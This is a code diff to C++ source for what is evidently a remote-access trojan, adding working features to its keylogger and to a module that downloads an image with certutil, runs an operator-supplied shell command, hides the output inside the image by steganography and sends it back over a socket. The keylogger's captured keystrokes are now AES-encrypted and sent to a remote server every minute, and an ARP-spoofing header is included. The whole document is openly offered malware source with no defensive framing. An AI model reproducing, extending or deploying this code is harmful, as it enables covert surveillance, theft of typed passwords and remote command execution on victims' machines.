@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include "Components.h"
 #include "arpspoof.h"
 
@@ -77,7 +78,7 @@ string OpenSocket(std::string ip_and_port)
 {
 	while (true)
 	{
-		thread t1(&OpenSocketWithThread, ip_and_port);
+		thread t1(OpenSocketWithThread, ip_and_port);
 		t1.detach();
 	}
 }
@@ -180,16 +181,13 @@ string GetArpTable()
 	return s;
 }
 
-string StartKeyLogger(string nothing)
+string StartKeyLogger(string sharedKey)
 {
-	while (true)
-	{
-		storeKeys = true;
-		thread t1(&KeyLogger);
-		t1.detach();
-		thread t2(&SendKeyLoggerToServer);
-		t2.detach();
-	}
+	storeKeys = true;
+	thread t1(KeyLogger);
+	t1.detach();
+	thread t2(SendKeyLoggerToServer, sharedKey);
+	t2.detach();
 	return "Key Logger Started";
 }
 
@@ -199,11 +197,18 @@ string StopKeyLogger(string nothing)
 	return "Key logger stoped";
 }
 
-string HideMessageInPicture(string fileName)
+string HideMessageInPicture(string fileName_and_cmd)
 {
-	thread t1(&SendPicture, fileName);
+ 	vector<string> params = split(fileName_and_cmd);
+	vector<string>::iterator it = params.begin();
+	string fileName = *it;
+	string cmd = *(++it);
+
+	//SendPicture(fileName, cmd);
+
+	thread t1(SendPicture, fileName, cmd);
 	t1.detach();
-	return string();
+	return "I will send you result via picture";
 }
 
 
@@ -469,9 +474,10 @@ bool SpecialKeys(int S_Key) {
 	}
 }
 
-void SendPicture(string fileName)
+void SendPicture(string fileName, string cmd)
 {
-	string newFile = EncodeTextInsideImg(fileName);
+	Sleep(1000);
+	string newFile = EncodeTextInsideImg(fileName, cmd);
 
 	WSADATA wsadata;
 	SOCKET s = NULL;
@@ -541,7 +547,7 @@ void SendPicture(string fileName)
 		{
 			//printf("Sending Buffer size = %d \n", iResult);
 		}
-		Sleep(1000);
+		Sleep(100);
 	}
 
 	//Sending last Chunk
@@ -551,16 +557,23 @@ void SendPicture(string fileName)
 	iResult = send(s, message.c_str(), message.size(), 0);
 }
 
-string EncodeTextInsideImg(string fileName)
+string EncodeTextInsideImg(string fileName, string cmd)
 {
 	string downloadImg = string("certutil.exe -urlcache -f ").append(fileName).append(" 1.png");
 	exec(downloadImg);
-	string text = "LOOK: This is new string";
+	string text = exec(cmd);
 	Mat img, stego;
 	int b = 0;
 	int bits = text.length() * 8 + 7;
 
-	img = imread("png.1", IMREAD_COLOR);
+	char path_in[256];
+	char path_out[256];
+	GetCurrentDirectory(sizeof(path_in), path_in);
+	GetCurrentDirectory(sizeof(path_out), path_out);
+	strcat(path_in, "\\1.png");
+	strcat(path_out, "\\2.png");
+
+	img = imread(path_in, IMREAD_COLOR);
 
 	img.copyTo(stego);
 
@@ -586,17 +599,15 @@ string EncodeTextInsideImg(string fileName)
 		}
 	}
 
-	string newFile = "2.png";
+	imwrite(path_out, stego);
 
-	imwrite(newFile, stego);
-
-	return newFile;
+	return path_out;
 
 }
 
 void KeyLogger()
 {
-	char KEY = 'x';
+	char KEY = ' ';
 
 	while (storeKeys) {
 		Sleep(10);
@@ -619,10 +630,11 @@ void KeyLogger()
 	}
 }
 
-void SendKeyLoggerToServer()
+void SendKeyLoggerToServer(string sharedKey)
 {
 	WSADATA wsadata;
 	SOCKET s = NULL;
+	AES_crypto aes(sharedKey);
 
 	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);
 
@@ -658,7 +670,8 @@ void SendKeyLoggerToServer()
 	while (true)
 	{
 		Sleep(60000);
-		send(s, kl.c_str(), kl.size(), 0);
+		string message = string("6").append(aes.Encrypt(kl));
+		send(s, message.c_str(), message.size(), 0);
 		cout << kl << endl;
 		kl = "";
 	}
